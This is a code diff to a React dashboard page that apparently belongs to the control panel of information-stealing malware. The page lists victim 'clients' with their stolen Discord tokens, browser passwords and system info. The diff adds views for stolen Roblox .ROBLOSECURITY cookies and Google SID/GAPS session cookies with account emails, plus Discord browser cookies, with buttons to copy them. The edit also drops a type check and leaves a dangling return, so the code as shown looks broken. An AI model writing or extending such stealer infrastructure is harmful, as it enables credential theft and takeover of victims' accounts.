@@ -19,17 +19,23 @@ const TYPE_ICONS: Record<string, string> = {
   discord_token: "💬",
   browser_passwords: "🔑",
   system_info: "🖥️",
+  roblox_cookies: "🎮",
+  google_cookies: "🔴",
+  discord_browser_cookies: "💜",
 }
 
 const TYPE_LABELS: Record<string, string> = {
   discord_token: "Discord Tokens",
   browser_passwords: "Browser Passwords",
   system_info: "System Info",
+  roblox_cookies: "Roblox Cookies",
+  google_cookies: "Google Cookies",
+  discord_browser_cookies: "Discord Browser",
 }
 
 export default function DatabasePage() {
   const [clients, setClients] = useState<ClientFolder[]>([])
-  const [stats, setStats] = useState({ totalData: 0, totalClients: 0, discordTokens: 0, browserPasswords: 0 })
+  const [stats, setStats] = useState({ totalData: 0, totalClients: 0, discordTokens: 0, browserPasswords: 0, robloxCookies: 0, googleCookies: 0 })
   const [loading, setLoading] = useState(true)
   const [expanded, setExpanded] = useState<string | null>(null)
   const [activeType, setActiveType] = useState<string | null>(null)
@@ -76,7 +82,7 @@ export default function DatabasePage() {
     )
   })
 
-  const types = ["discord_token", "browser_passwords", "system_info"]
+  const types = ["discord_token", "browser_passwords", "system_info", "roblox_cookies", "google_cookies", "discord_browser_cookies"]
 
   return (
     <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-5 pb-8">
@@ -89,12 +95,14 @@ export default function DatabasePage() {
       </div>
 
       {/* Stats */}
-      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
         {[
           { v: stats.totalClients, l: "Clients", c: "#8b5cf6" },
-          { v: stats.totalData, l: "Total Records", c: "#22c55e" },
+          { v: stats.totalData, l: "Records", c: "#22c55e" },
           { v: stats.discordTokens, l: "Discord Tokens", c: "#eab308" },
-          { v: stats.browserPasswords, l: "Browser Passwords", c: "#3b82f6" },
+          { v: stats.browserPasswords, l: "Passwords", c: "#3b82f6" },
+          { v: stats.robloxCookies || 0, l: "Roblox", c: "#f97316" },
+          { v: stats.googleCookies || 0, l: "Google", c: "#ef4444" },
         ].map(({ v, l, c }) => (
           <div key={l} className="rounded-xl border border-zinc-800 bg-zinc-900/60 p-4">
             <span className="text-2xl font-bold" style={{ color: c }}>{v}</span>
@@ -261,7 +269,72 @@ export default function DatabasePage() {
                                 )
                               }
 
-                              if (item.type === "system_info") {
+                              if (item.type === "roblox_cookies") {
+                                return (
+                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
+                                    <div className="flex items-center justify-between mb-2">
+                                      <Badge variant="danger" className="text-[9px]">🎮 Roblox Cookie</Badge>
+                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
+                                    </div>
+                                    <p className="text-[10px] text-zinc-400 mb-2">{parsed.note || ".ROBLOSECURITY cookie found"}</p>
+                                    <div className="flex items-center gap-2 bg-black/40 rounded-lg p-2">
+                                      <code className="text-[10px] text-orange-400 font-mono flex-1 break-all">{parsed.cookie?.substring(0, 60) || "..."}</code>
+                                      {parsed.cookie && (
+                                        <button onClick={() => navigator.clipboard.writeText(parsed.cookie)} className="text-[9px] px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300 shrink-0">Copy</button>
+                                      )}
+                                    </div>
+                                  </div>
+                                )
+                              }
+
+                              if (item.type === "google_cookies") {
+                                return (
+                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
+                                    <div className="flex items-center justify-between mb-2">
+                                      <Badge variant="success" className="text-[9px]">🔴 Google Cookies</Badge>
+                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
+                                    </div>
+                                    <p className="text-[10px] text-zinc-400 mb-2">{parsed.accounts_found} account(s) found</p>
+                                    {parsed.cookies && Array.isArray(parsed.cookies) && parsed.cookies.map((acc: any, i: number) => (
+                                      <div key={i} className="bg-black/40 rounded-lg p-2 mb-2">
+                                        <div className="flex items-center gap-2 text-[10px]">
+                                          <span className="text-zinc-500">Source:</span>
+                                          <span className="text-zinc-300">{acc.source || "Browser"}</span>
+                                        </div>
+                                        {acc.email && (
+                                          <div className="flex items-center gap-2 text-[10px] mt-1">
+                                            <span className="text-zinc-500">Email:</span>
+                                            <span className="text-cyan-400 font-mono">{acc.email}</span>
+                                          </div>
+                                        )}
+                                        <div className="flex items-center gap-1 mt-1">
+                                          {acc.SID_found && <span className="px-1.5 py-0.5 rounded bg-green-500/20 text-green-400 text-[9px]">SID</span>}
+                                          {acc.GAPS_found && <span className="px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 text-[9px]">GAPS</span>}
+                                        </div>
+                                      </div>
+                                    ))}
+                                    <p className="text-[9px] text-zinc-500 mt-1">{parsed.note}</p>
+                                  </div>
+                                )
+                              }
+
+                              if (item.type === "discord_browser_cookies") {
+                                return (
+                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
+                                    <div className="flex items-center justify-between mb-2">
+                                      <Badge variant="warning" className="text-[9px]">💜 Discord Browser Cookie</Badge>
+                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
+                                    </div>
+                                    <div className="flex items-center gap-2 bg-black/40 rounded-lg p-2">
+                                      <code className="text-[10px] text-purple-400 font-mono flex-1 break-all">{parsed.cookie?.substring(0, 60) || "..."}</code>
+                                      {parsed.cookie && (
+                                        <button onClick={() => navigator.clipboard.writeText(parsed.cookie)} className="text-[9px] px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300 shrink-0">Copy</button>
+                                      )}
+                                    </div>
+                                    <p className="text-[9px] text-zinc-500 mt-1">{parsed.note}</p>
+                                  </div>
+                                )
+                              }
                                 return (
                                   <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                     <div className="flex items-center justify-between mb-2">
